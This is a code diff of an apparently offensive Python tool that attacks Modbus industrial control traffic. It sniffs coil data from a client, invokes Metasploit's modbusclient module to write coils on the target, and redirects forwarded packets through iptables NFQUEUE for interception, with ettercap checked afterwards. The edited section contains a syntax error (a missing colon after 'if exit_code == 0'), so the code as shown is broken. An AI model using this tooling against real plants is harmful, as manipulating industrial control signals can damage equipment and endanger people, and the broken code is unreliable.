@@ -258,18 +258,16 @@ def fool():
 
 
     def preserve():
+        global coildata
+        coildata = b""
         def init():
             global cflag
             cflag = "0"
             def pull(packet):
                 print("Modbus Packet Intercepted")
-                hexdump(packet)
                 if packet.haslayer(Raw):
-                    print("Modbus Raw Layer Intercepted, Storing...")
-                    global coildata
+                    global coildata, cflag
                     coildata = packet[Raw].load[9:]
-                    global cflag
-                    cflag = "0"
                     print(coildata)           
                     
             sniff(filter="port "+ nm_config.mod_port +" and src host "+ nm_config.modcli_ip, prn=pull, count=10)
@@ -315,13 +313,14 @@ def fool():
             input("Press any key to send command...")
             print("Loading msfconsole with given parameters...")
 
-            #subprocess.Popen("sudo qterminal -e \"
-            #try:
-            subprocess.Popen("msfconsole -q -x \"use auxiliary/scanner/scada/modbusclient;set RHOSTS "+ nm_config.modcli_ip+";set action WRITE_COILS;set NUMBER " + str(num_coils) + ";set RPORT " + nm_config.mod_port + ";set DATA_COILS " + coil_data + "; set DATA_ADDRESS " + coil_address + "; run;\"", shell=True, preexec_fn=os.setpgrp)
-            #except:
-            subprocess.run(["iptables", "-A", "FORWARD", "-p", "tcp", "-s", nm_config.modcli_ip, "--sport", nm_config.mod_port, "-j", "NFQUEUE", "--queue-num", "0"], check=True)
-
+            # Launch the background msfconsole setup
+            process = subprocess.Popen("msfconsole -q -x \"use auxiliary/scanner/scada/modbusclient;set RHOSTS "+ nm_config.modcli_ip+";set action WRITE_COILS;set NUMBER " + str(num_coils) + ";set RPORT " + nm_config.mod_port + ";set DATA_COILS " + coil_data + "; set DATA_ADDRESS " + coil_address + "; run; exit;\"", shell=True, preexec_fn=os.setpgrp)
             
+            # Pause execution while msfconsole is setting up
+            exit_code = process.wait()
+            
+            if exit_code == 0
+                subprocess.run(["iptables", "-A", "FORWARD", "-p", "tcp", "-s", nm_config.modcli_ip, "--sport", nm_config.mod_port, "-j", "NFQUEUE", "--queue-num", "0"], check=True)
             
             print("Intercepting Packets...")
             nfqueue.run()
@@ -331,9 +330,12 @@ def fool():
             subprocess.run(["iptables", "-F"], check=True)
             print("Exiting...")
             time.sleep(0.5)
-            nfqueue.bind()
+            try:
+                nfqueue.unbind()
+            except:
+                pass
             return
-            pass
+        
     try:
         print("Checking ettercap...")
         
